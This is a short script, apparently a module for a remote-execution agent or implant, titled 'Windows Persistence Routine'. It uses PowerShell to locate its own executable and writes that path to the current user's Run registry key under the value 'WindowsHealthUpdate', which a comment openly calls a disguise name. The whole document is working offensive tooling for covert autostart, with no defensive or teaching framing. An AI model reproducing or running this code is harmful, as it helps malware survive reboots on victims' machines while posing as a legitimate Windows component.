print_log("Starting Windows Persistence Routine...");

// 1. Locate Self
// Use PowerShell to get the exact path of the running process
let get_path_cmd = "powershell -NoProfile -Command \"[System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName\"";
let raw_path = exec_os(get_path_cmd);

// Debugging: Print exactly what we got (surrounded by brackets to see whitespace)
print_log("Raw Output: [" + raw_path + "]");

// 2. Clean the Path (Manual Trim)
// We remove Carriage Returns (\r) and Newlines (\n) manually to be safe
let self_path = raw_path;
self_path.replace("\r", "");
self_path.replace("\n", "");

// Additional check: If the path is empty or obviously wrong
if self_path.len < 3 {
    return "Error: Path too short. Got: " + self_path;
}

print_log("Target Binary: " + self_path);

// 3. Define Registry Key
// Name: 'WindowsHealthUpdate' (Disguise name)
let reg_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
let value_name = "WindowsHealthUpdate";

// 4. Construct Reg Command
// Note: We use 'reg add' via cmd.exe. 
// We verify self_path is wrapped in quotes to handle spaces in 'Program Files'
let cmd = "reg add \"" + reg_key + "\" /v \"" + value_name + "\" /t REG_SZ /d \"" + self_path + "\" /f";

print_log("Executing Registry Add...");
let result = exec_os(cmd);

// 5. Verification
if result.contains("success") || result.contains("0") {
    return "[SUCCESS] Registry key added.\nKey: " + reg_key + "\nValue: " + value_name + "\nTarget: " + self_path;
} else {
    return "[FAILURE] Registry update failed.\nCommand Output: " + result;
}
